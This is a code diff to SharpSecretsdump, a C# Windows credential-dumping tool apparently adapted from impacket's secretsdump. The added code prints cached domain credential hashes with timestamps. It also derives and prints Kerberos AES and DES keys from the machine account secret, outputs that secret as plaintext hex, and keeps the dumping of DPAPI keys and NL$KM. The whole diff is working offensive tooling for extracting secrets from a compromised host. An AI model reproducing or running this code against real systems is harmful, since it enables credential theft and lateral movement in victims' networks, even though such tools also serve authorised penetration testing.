@@ -1,4 +1,5 @@
-﻿using System;
+﻿using SharpSecretsdump.lib.Kerberos;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -165,8 +166,9 @@ namespace SharpSecretsdump
                             string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength)
                                 + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                             domain = domain.Replace("\0", "");
-                            Console.WriteLine(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain,
-                                    username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
+                            Console.WriteLine(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}: ({4})", domain,
+                                    username, username, Hexlify(hashedPW),
+                                    cachedUser.lastWrite.ToString("yyyy-MM-dd HH:mm:ss")));
                         }
                     }
                 }
@@ -219,15 +221,19 @@ namespace SharpSecretsdump
                                     Console.WriteLine($"[*] {secret}");
                                     if (secret.ToUpper().StartsWith("$MACHINE.ACC"))
                                     {
-                                        string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
+                                        string computerAcctHash = Hexlify(Crypto.Md4Hash2(secretBlob.secret));
                                         string domainName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Domain")).Trim('\0');
                                         string computerName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Hostname")).Trim('\0');
-                                        Console.WriteLine(string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", domainName, computerName, computerAcctHash));
+
+                                        PrintMachineKerberos(secretBlob.secret, domainName, computerName);
+
+                                        Console.WriteLine(string.Format("{0}\\{1}$:plain_password_hex:{2}", domainName, computerName, Hexlify(secretBlob.secret)));
+                                        Console.WriteLine(string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}:::", domainName, computerName, computerAcctHash));
                                     }
                                     else if (secret.ToUpper().StartsWith("DPAPI"))
                                     {
-                                        Console.WriteLine("dpapi_machinekey:0x" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower());
-                                        Console.WriteLine("dpapi_userkey:0x" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
+                                        Console.WriteLine("dpapi_machinekey:0x" + Hexlify(secretBlob.secret.Skip(4).Take(20).ToArray()));
+                                        Console.WriteLine("dpapi_userkey:0x" + Hexlify(secretBlob.secret.Skip(24).Take(20).ToArray()));
                                     }
                                     else if (secret.ToUpper().StartsWith("_SC_"))
                                     {
@@ -252,7 +258,7 @@ namespace SharpSecretsdump
                                 Console.WriteLine("[*] NL$KM");
                                 if (secretBlob.length > 0)
                                 {
-                                    Console.WriteLine("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
+                                    Console.WriteLine("NL$KM:" + Hexlify(secretBlob.secret));
                                 }
                             }
                         }
@@ -267,6 +273,30 @@ namespace SharpSecretsdump
             catch (Exception e)
             {
                 Console.WriteLine(e.ToString());
+            }
+        }
+
+        // Copied from secretsdump.py from impacket
+        public static void PrintMachineKerberos(byte[] secret, String domaineName, String computerName)
+        {
+            byte[] salt = Encoding.UTF8.GetBytes($"{domaineName.ToUpper()}host{computerName.ToLower()}.{domaineName.ToLower()}");
+
+            Encoding UTF16decoder = Encoding.GetEncoding(System.Text.UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback());
+            Encoding UTF8encoder = Encoding.GetEncoding(System.Text.UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback());
+
+            byte[] rawSecret = UTF8encoder.GetBytes(UTF16decoder.GetString(secret));
+
+            var kerberosEncryptions = new EncryptionType[]
+            {
+                EncryptionType.AES256_CTS_HMAC_SHA1_96,
+                EncryptionType.AES128_CTS_HMAC_SHA1_96,
+                EncryptionType.DES_CBC_MD5
+            };
+
+            foreach(EncryptionType type in kerberosEncryptions)
+            {
+                byte[] key = KeyGenerator.MakeKey(type, UTF8encoder.GetString(rawSecret), UTF8encoder.GetString(salt));
+                Console.WriteLine($"{domaineName}\\{computerName}:{type.ToString().ToLower().Replace("_", "-")}:{Hexlify(key)}");
             }
         }
 
@@ -330,7 +360,7 @@ namespace SharpSecretsdump
                     if (ntHashLength <= 0)
                         continue;
 
-                    //old style hashes
+                    // old style hashes
                     if (v[ntHashOffset + 2].Equals(0x01))
                     {
                         IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
@@ -467,5 +497,7 @@ namespace SharpSecretsdump
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
+
+        public static String Hexlify(byte[] array) => BitConverter.ToString(array).Replace("-", "").ToLower();
     }
 }
